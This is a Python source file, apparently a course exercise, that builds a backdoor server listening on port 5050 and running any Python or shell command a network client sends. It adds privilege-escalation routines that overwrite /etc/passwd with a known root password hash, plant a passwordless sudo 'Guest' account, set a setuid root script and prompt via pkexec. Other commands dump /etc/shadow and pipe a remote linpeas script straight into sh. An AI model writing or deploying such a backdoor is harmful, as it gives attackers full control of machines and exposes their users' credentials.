#!/usr/bin/env python3

# This is all in one file to make it easier to transfer to the remote machine
# That does NOT mean we can't organize it nicely using functions and classes!


# NOTE: Do not put dependencies that require pip install X here!
# Put it inside of the function that bootstraps them instead
import os
import socket
import subprocess
import sys
import time
import io

import logging
from urllib.parse import urljoin
#also hashcat requires downlaoding onto the vm


THIS_FILE = os.path.realpath(__file__)

# listen on port 5050, receive input
HOST, PORT = "0.0.0.0", 5050

# if os.geteuid() == 0:
    #print("we should be escalated?")

def run_command(cmd, shell=True, capture_output=True, **kwargs):
    return subprocess.run(
        cmd,
        shell=shell,
        capture_output=capture_output,
        text=True,
        **kwargs
    )


def kill_others(): # Consider not killing the parent process so it can connect to the terminal...
    """
    Since a port can only be bound by one program, kill all other programs on this port that we can see.
    This makes it so if we run our script multiple times, only the most up-to-date/priviledged one will be running in the end
    """
    # check if privilege escalated
    # if os.geteuid() == 0:
    # if so, kill all other non-privileged copies of it
    pid = run_command(f"lsof -ti TCP:{str(PORT)}").stdout
    if pid:
        pids = pid.strip().split("\n")
        print("Killing", pids)
        for p in pids:
            run_command(f"kill {str(p)}")
        time.sleep(1)

def bootstrap_packages():
    """
    This allows us to install any python package we want as part of our malware.
    In real malware, we would probably packages these extra dependencies with the payload,
    but for simplicitly, we just install it. If you are curious, look into pyinstaller
    """
    print(sys.prefix, sys.base_prefix)
    if sys.prefix == sys.base_prefix:
        # we're not in a venv, make one
        print("running in venv")
        import venv

        venv_dir = os.path.join(os.path.dirname(THIS_FILE), ".venv")
        # print(venv_dir)
        if not os.path.exists(venv_dir):
            print("creating venv")
            venv.create(venv_dir, with_pip=True)
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
        else:
            print("venv exists, but we still need to open inside it")
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
    else:
        print("already in venv")
        run_command(
            [ sys.executable, "-m", "pip", "install", "requests"], shell=False, capture_output=False
        ).check_returncode() # example to install a python package on the remote server
        # If you need pip install X packages, here, import them now
        run_command(
            [ sys.executable, "-m", "pip", "install", "bs4"], shell=False, capture_output=False
        ).check_returncode()# example to install a python package on the remote server
        run_command(
            [ sys.executable, "-m", "pip", "install", "keyboard"], shell=False, capture_output=False
        ).check_returncode()# example to install a python package on the remote server
        run_command(
            [ sys.executable, "-m", "pip", "install", "Pillow"], shell=False, capture_output=False
        ).check_returncode() # example to install a python package on the remote server
        # If you need pip install X packages, here, import them now
        run_command(
            [ sys.executable, "-m", "pip", "install", "playsound"], shell=False, capture_output=False
        ).check_returncode()# example to install a python package on the remote server
        import requests
        from bs4 import beautifulsoup
        import keyboard
        from playsound import playsound
        from PIL import ImageGrab



def handle_conn(conn, addr):
    with conn:
        print(f"connected by {addr}")
        # If you need to receive more data, you may need to loop
        # Note that there is actually no way to know we have gotten "all" of the data
        # We only know if the connection was closed, but if the client is waiting for us to say something,
        # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
        # For example, you could send a length value before any command, decide on null byte as ending,
        # base64 encode every command, etc
        
        # We have decided to use 🥔 as a delimiter
        data = conn.recv(1024)
        response = "No response received." 

        # print("received: " + data.decode("utf-8", errors="replace"))
        # py_command = data.decode("utf-8", errors="replace").strip().split("🥔")
        # print(py_command)

        if ((data.decode("utf-8", errors="replace").strip()).startswith('PY')):
            # print('potato 🥔pythonnnnn')
            # print(py_command[0].split(' ')[1])
            py_command = data.decode("utf-8", errors="replace").strip().split("🥔") # removes the potato at the end
            py_command = py_command[0].split(' ', 1)[1] #removes PY
            
            # Remainder of this if statement is largely taken from ChatGPT
            # Create a StringIO object to capture the print output
            output_capture = io.StringIO()

            # Save the current stdout so we can restore it later
            old_stdout = sys.stdout
            sys.stdout = output_capture  # Redirect stdout to capture print statements

            try:
                # Evaluate the command (or exec it if eval fails)
                response = eval(py_command)
            except:
                # If eval fails, try exec instead
                exec(py_command)
                response = "No detected output."  # exec does not return a value, so we set response to None
            
            # Restore the original stdout
            sys.stdout = old_stdout

            # Get the printed output
            printed_output = output_capture.getvalue()

            # If there was output from print, include it with the response
            if printed_output:
                response = printed_output.strip()  # Strip any trailing newlines from print output


        if ((data.decode("utf-8", errors="replace").strip()).startswith('BASH')):
            bash_command = data.decode("utf-8", errors="replace").strip().split("🥔") # removes the potato at the end
            bash_command = bash_command[0].split(' ', 1)[1] #removes BASH
            
            
            try:
                response = subprocess.run([bash_command, '/usr/bin/python3', THIS_FILE], shell=True, capture_output=True, text=True)
                response = response.stdout.strip()
            except:
                # If subprocess.run fails, then something happened!
                response = "Could not run that command."  # exec does not return a value, so we set response to None
            # try: #ADDED SOME STUFF DUNNNO HOW TO CHECK IF RIGHT
            #     with open("/etc/shadow") as f:
            #         conn.send(f.read().encode())
            # except:
            #     print("ah)
            
            
        # priv esc by prompting user for password
        if (data.decode("utf-8", errors="replace").strip() == 'PRIVESC'):
            # subprocess.Popen([sys.executable, THIS_FILE])
            subprocess.run(['pkexec', '/usr/bin/python3', THIS_FILE])
            response = "Attempted to escalate privilege."

        if (data.decode("utf-8", errors="replace").strip() == 'GUESTUSER'):
            try:
                # Create the guest user
                subprocess.run(['sudo', 'adduser', '--disabled-password', '--gecos', '""', 
                                '--allow-bad-names','Guest'], check=True)
                
                # Add the user to the sudoers file programmatically
                with open('/etc/sudoers', 'a') as sudoers_file:
                    sudoers_file.write('\nGuest ALL=(ALL) NOPASSWD: ALL\n')

                response = "Created Guest with admin privileges."
            except subprocess.CalledProcessError as e:
                response = f"Error occurred: {e}"

        
        # priv esc by writing to /etc/passwd
        if (data.decode("utf-8", errors="replace").strip() == 'PASSWD_PE'):
            subprocess.run(['cp', '/etc/passwd', '.'])
            subprocess.call('echo "root:$1$MF9Cdgxu$nc7/d.DlsjrOugxV3dzM9/:0:0:root:/root:/bin/bash" > /etc/passwd', shell=True)
            subprocess.call('cat passwd | tail -n+2 >> /etc/passwd', shell=True)
            subprocess.run(['rm', 'passwd'])
            subprocess.run(['sudo', 'su'], input='potato', capture_output=True, text=True)
            # p = subprocess.Popen(['sudo', 'su'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            # stdout_data = p.communicate(input='potato')[0]
            
            subprocess.run(['whoami'])

        # priv esc using chmod
        if (data.decode("utf-8", errors="replace").strip() == 'CHMOD_PE'):
            subprocess.run(['touch', 'x'])
            subprocess.call('echo "#!/bin/bash\nsudo -i" > x', shell=True)
            subprocess.run(['sudo', 'chmod', '6777', 'x'])
            subprocess.run(['sudo', './x'])
            subprocess.run(['rm', 'x'])

        # search for paths to escalate privileges. may take a while (~4 min) to run
        if (data.decode("utf-8", errors="replace").strip() == 'LINPEAS'):
            subprocess.call('curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', shell=True)
        
        # get /etc/shadow
        if (data.decode("utf-8", errors="replace").strip() == 'SHADOW'):
            with open("/etc/shadow") as f:
                response = f.read() 
                # conn.send(f.read().encode())



        if not data:
            return

        # Think VERY carefully about how you will communicate between the client and server
        # You will need to make a custom protocol to transfer commands

        try:
            conn.sendall(response.encode())
            # Process the communication data from client
        except Exception as e:
            conn.sendall(f"error: {e}".encode())


def main():
    kill_others()
    bootstrap_packages()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while True:
            global PORT
            try:
                s.bind((HOST, PORT))
            except socket.error as e: #frankly, if this fails we're cooked! we hard coded 5050 everywhere else
                print(f"Failed to bind on port {PORT}: {e}")
                PORT += 1
            else:
                print(f"Successfully bound on port {PORT}")
                break
        s.listen()  # allows for 10 connections
        print(f"Listening on {HOST}:{PORT}")
        while True:
            try:
                conn, addr = s.accept()
                handle_conn(conn, addr)
            except KeyboardInterrupt:
                raise # try to make it so that commands typed into terminal are actually executed?
            except:
                print("Connection died")


if __name__ == "__main__":
    main()
